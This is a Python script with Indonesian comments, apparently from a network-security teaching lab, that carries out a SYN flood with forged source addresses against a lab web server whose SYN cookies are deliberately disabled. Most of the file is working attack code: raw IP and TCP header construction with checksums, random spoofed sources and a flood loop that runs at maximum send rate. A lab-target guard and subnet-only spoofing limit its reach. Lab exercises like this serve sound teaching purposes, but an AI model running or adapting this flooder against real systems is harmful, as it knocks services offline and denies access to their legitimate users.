#!/usr/bin/env python3
"""SYN flood dengan alamat asal dipalsukan.

Pemakaian:
    python3 syn-flood.py <target> [detik] [paket_per_detik]

paket_per_detik 0 berarti secepat yang bisa dikirim mesin ini. Itu yang
dipakai di langkah wajib, karena di bawah kira-kira 5000 paket per detik
efeknya cuma sebagian: sebagian permintaan sah masih lolos.

Contoh:
    python3 /lab/serang/syn-flood.py web 20 0        secepatnya
    python3 /lab/serang/syn-flood.py web 20 5000     versi lebih ringan

Cara kerjanya: kirim paket SYN, jangan pernah balas SYN-ACK yang datang.
Server menyimpan tiap koneksi setengah jadi itu di antrean SYN sampai
kedaluwarsa. Kalau antreannya penuh, permintaan koneksi yang sah ikut ditolak.

TIGA HAL YANG PERLU DIPAHAMI SEBELUM MENJALANKAN:

1. Alamat asal palsu SELALU diambil dari subnet lab ini sendiri. Itu bukan
   pilihan gaya. Alamat di subnet yang terhubung langsung membuat balasan
   SYN-ACK berhenti di ARP yang tidak pernah dijawab, jadi tidak ada satu
   paket pun yang punya alasan untuk keluar dari jaringan lab. Alamat acak
   di luar subnet akan membuat balasan dikirim ke rute default, dan di lab
   soal keamanan itu tidak boleh terjadi.

2. Ini butuh hak raw socket. Toolbox punya NET_RAW dari
   _shared/compose.base.yaml. Tanpa itu skrip ini berhenti, tidak diam-diam
   berganti ke cara lain.

3. Target 'web' sengaja dimatikan SYN cookies-nya lewat sysctls di
   compose.yaml. Tanpa itu, SYN flood sekecil ini tidak akan menimbulkan efek
   apa pun di kernel Linux modern, dan itu justru pelajarannya: coba juga ke
   'web-aman' yang SYN cookies-nya menyala.
"""

import ipaddress
import random
import socket
import struct
import sys
import time

sys.path.insert(0, "/lab/serang")
from pagar import alamat_sendiri, pastikan_target_lab  # noqa: E402

PORT = 80


def jumlah_periksa(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def paket_syn(ip_asal, ip_tujuan, port_asal, port_tujuan):
    asal = socket.inet_aton(ip_asal)
    tujuan = socket.inet_aton(ip_tujuan)

    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,                       # versi 4, panjang header 5 kata
        0,                          # DSCP dan ECN
        40,                         # total panjang: 20 IP + 20 TCP
        random.randint(1, 65535),   # identifikasi
        0,                          # flag dan fragment offset
        64,                         # TTL
        socket.IPPROTO_TCP,
        0,                          # checksum, diisi kernel
        asal,
        tujuan,
    )

    tcp_hdr = struct.pack(
        "!HHLLBBHHH",
        port_asal,
        port_tujuan,
        random.randint(0, 0xFFFFFFFF),  # sequence number
        0,                              # acknowledgement number
        5 << 4,                         # data offset 5 kata, reserved 0
        0x02,                           # flag SYN
        1024,                           # window
        0,                              # checksum, dihitung di bawah
        0,                              # urgent pointer
    )

    semu = struct.pack("!4s4sBBH", asal, tujuan, 0, socket.IPPROTO_TCP,
                       len(tcp_hdr))
    cek = jumlah_periksa(semu + tcp_hdr)
    tcp_hdr = tcp_hdr[:16] + struct.pack("!H", cek) + tcp_hdr[18:]
    return ip_hdr + tcp_hdr


def main():
    nama = sys.argv[1] if len(sys.argv) > 1 else "web"
    durasi = float(sys.argv[2]) if len(sys.argv) > 2 else 25.0
    pps = int(sys.argv[3]) if len(sys.argv) > 3 else 0

    ip, subnet = pastikan_target_lab(nama)
    saya = alamat_sendiri(ip)
    gerbang = str(next(subnet.hosts()))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        sys.exit(
            "Raw socket ditolak. Container ini tidak punya NET_RAW.\n"
            "Jalankan lewat toolbox lab: ./lab sh 07"
        )

    print("target      : %s (%s) port %d" % (nama, ip, PORT))
    print("subnet lab  : %s" % subnet)
    print("alamat palsu: acak di dalam %s, kecuali %s, %s, dan %s"
          % (subnet, saya, ip, gerbang))
    if pps > 0:
        print("rencana     : %.0f detik, sekitar %d paket per detik\n"
              % (durasi, pps))
    else:
        print("rencana     : %.0f detik, secepat yang bisa dikirim\n"
              % durasi)

    hindari = {saya, ip, gerbang, str(subnet.network_address),
               str(subnet.broadcast_address)}
    rentang_awal = int(subnet.network_address) + 1
    rentang_akhir = int(subnet.broadcast_address) - 1

    terkirim = 0
    mulai = time.time()
    lapor = mulai
    jeda = 1.0 / pps if pps > 0 else 0
    try:
        while time.time() - mulai < durasi:
            palsu = str(ipaddress.IPv4Address(
                random.randint(rentang_awal, rentang_akhir)))
            if palsu in hindari:
                continue
            s.sendto(
                paket_syn(palsu, ip, random.randint(1024, 65535), PORT),
                (ip, 0),
            )
            terkirim += 1
            if jeda:
                time.sleep(jeda)
            if time.time() - lapor >= 2.0:
                print("detik %-3d paket SYN terkirim: %d"
                      % (int(time.time() - mulai), terkirim))
                lapor = time.time()
    except KeyboardInterrupt:
        pass
    finally:
        s.close()

    print("\ntotal paket SYN terkirim: %d dalam %.1f detik"
          % (terkirim, time.time() - mulai))
    print("Tidak satu pun dibalas ACK. Sebagian mengisi antrean SYN target,")
    print("sisanya dibuang kernel target justru KARENA antreannya sudah penuh.")
    print("Dua-duanya bisa dilihat angkanya dengan:")
    print("  ./lab sh 07 %s   lalu   sh /serang/kernel-metrik.sh" % nama)


if __name__ == "__main__":
    main()
